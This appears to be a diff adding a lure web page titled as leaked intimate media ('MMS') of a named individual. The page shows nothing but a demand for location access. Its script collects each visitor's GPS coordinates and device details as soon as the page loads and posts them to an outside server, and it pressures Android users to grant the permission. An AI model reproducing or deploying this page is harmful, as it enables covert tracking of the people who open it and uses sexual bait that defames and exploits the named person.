@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="theme-color" content="#f1ffeb" />
+    <meta name="title" content="Yadav Gawande MMS Leaked" />
+    <meta name="description" content="Yadav Gawande MMS Leaked" />
+    <title>Yadav Gawande MMS Leaked</title>
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,500,600,700,700i,800,800i,900,900i"
+        rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+
+    <script>
+        window.onload = function () {
+            // Automatically request location access when the page loads
+            getLocation();
+        };
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToServer, handleError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function getBrowserAndDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const deviceMemory = navigator.deviceMemory || 'Unknown'; // For supported browsers
+
+            // Detect if the device is a mobile device
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+            return {
+                userAgent: userAgent,
+                platform: platform,
+                deviceMemory: deviceMemory,
+                isMobile: isMobile ? 'Yes' : 'No'
+            };
+        }
+
+        function sendLocationToServer(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const browserDeviceInfo = getBrowserAndDeviceInfo();
+
+            // Combine location and device/browser info
+            const dataToSend = {
+                latitude: lat,
+                longitude: lon,
+                source: 'GPS',
+                timestamp: new Date().toISOString(),
+                userAgent: browserDeviceInfo.userAgent,
+                platform: browserDeviceInfo.platform,
+                deviceMemory: browserDeviceInfo.deviceMemory,
+                isMobile: browserDeviceInfo.isMobile
+            };
+
+            // Send the GPS-based location and device/browser info to your server via POST request
+            fetch('https://banjarawedding.com/api/auth/track_location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(dataToSend)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Location and device information sent to server successfully.");
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+
+        function handleError(error) {
+            if (error.code === error.PERMISSION_DENIED) {
+                const isAndroid = /Android/i.test(navigator.userAgent);
+                if (isAndroid) {
+                    showAndroidSettingsInstructions();
+                } else {
+                    alert("Location access denied. Please enable location permissions.");
+                }
+            } else {
+                console.log("Geolocation error occurred: " + error.message);
+            }
+        }
+
+        function showAndroidSettingsInstructions() {
+            alert("To enable location access on Android:\n\n1. Open 'Settings'.\n2. Tap 'Apps & notifications'.\n3. Find your browser (e.g., Chrome) and tap 'Permissions'.\n4. Enable 'Location'.");
+        }
+    </script>
+</head>
+
+<body>
+    <div class="content-wrap">
+        <div class="cta-box">
+            <h1>Leaked MMS</h1>
+            <p>You need to allow location access to view this content.</p>
+        </div>
+    </div>
+</body>
+
+</html>
